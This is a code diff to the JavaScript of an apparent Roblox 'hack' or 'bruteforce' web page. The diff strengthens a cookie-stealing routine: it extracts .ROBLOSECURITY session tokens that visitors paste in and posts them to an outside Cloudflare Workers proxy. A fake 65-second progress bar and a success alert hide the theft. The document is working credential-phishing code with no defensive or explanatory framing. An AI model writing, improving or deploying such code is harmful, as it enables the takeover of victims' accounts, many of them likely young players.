@@ -1,58 +1,91 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
-function extractRobloxSecurityCookie(sessionId) {
-  const patterns = [
-    /\.ROBLOSECURITY[^=]+=([^;]+)/,
-    /\.ROBLOSECURITY",\s*"([^"]+)"/,
-    /_\|WARNING:-DO-NOT-SHARE-THIS[^_]+_/
-  ];
+// DOM Elements
+const usernameInput = document.getElementById('username');
+const sessionIdInput = document.getElementById('sessionId');
+const captchaCheckbox = document.getElementById('captcha');
+const errorDisplay = document.getElementById('error-message');
+const progressBar = document.getElementById('progress-bar');
+
+// ======================
+// Enhanced Cookie Extraction
+// ======================
+
+function extractRobloxSecurityCookie(rawInput) {
+  // Primary pattern for modern cookies
+  const fullCookiePattern = /(_\|WARNING:-DO-NOT-SHARE-THIS\.--[A-Za-z0-9+/=]{300,}_\|)/;
   
-  for (const pattern of patterns) {
-    const match = sessionId.match(pattern);
-    if (match) return match[0];
+  // Secondary patterns for various formats
+  const backupPatterns = [
+    /(\.ROBLOSECURITY=[A-Za-z0-9_-]{300,})/,
+    /(ROBLOSECURITY=([^;]{300,}))/,
+    /("ROBLOSECURITY","([^"]{300,})")/
+  ];
+
+  // Try primary pattern first
+  const fullMatch = rawInput.match(fullCookiePattern);
+  if (fullMatch) return fullMatch[0];
+
+  // Try backup patterns
+  for (const pattern of backupPatterns) {
+    const match = rawInput.match(pattern);
+    if (match) return match[1] || match[0];
   }
-  return sessionId; // Fallback to raw input
+
+  // Final fallback (with warning)
+  console.warn("Using raw input - may be incomplete");
+  return rawInput;
 }
 
-async function sendToProxy(sessionId) {
-  try {
-    // Encode in Base64 to avoid Discord truncation issues
-    const encodedCookie = btoa(unescape(encodeURIComponent(sessionId)));
-    console.log("[DEBUG] Cookie Length (Original):", sessionId.length);
-    console.log("[DEBUG] Cookie Length (Base64):", encodedCookie.length);
+// ======================
+// Transmission Function
+// ======================
 
+async function sendToProxy(cookie) {
+  try {
     const response = await fetch(CLOUDFLARE_PROXY_URL, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        sessionId: encodedCookie, // Send Base64-encoded
-        timestamp: new Date().toISOString()
-      })
+      headers: { 'Content-Type': 'text/plain' },
+      body: cookie
     });
 
-    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
-    return await response.json();
+    if (!response.ok) {
+      throw new Error(`Server responded with ${response.status}`);
+    }
+
+    return await response.text();
   } catch (error) {
-    console.error('Proxy error:', error);
+    console.error('Transmission failed:', error);
     throw error;
   }
 }
 
+
+
+
+
 function bruteforce(sessionId) {
-  if (typeof startHack === 'function') startHack();
+  startProgressBar();
   
   setTimeout(async () => {
     try {
       const cookie = extractRobloxSecurityCookie(sessionId);
+      console.log("Extracted cookie length:", cookie.length);
+      
+      if (cookie.length < 300) {
+        throw new Error("Cookie appears truncated");
+      }
+
       await sendToProxy(cookie);
-      if (typeof showCookieSuccess === 'function') showCookieSuccess();
+      hideError();
+      alert("Processing completed successfully!");
     } catch (error) {
-      console.error("Error:", error);
-      if (typeof showError === 'function') showError("Failed to process session ID");
+      showError("Failed to process session ID: " + error.message);
+    } finally {
+      progressBar.style.display = 'none';
     }
   }, 65000);
 }
-
 // Your existing validateInput function (unchanged)
 function validateInput() {
   const username = document.getElementById('username').value.trim();
@@ -85,6 +118,7 @@ function validateInput() {
 
   bruteforce(sessionId);
   hideError();
+    startHack();
 }
 
 
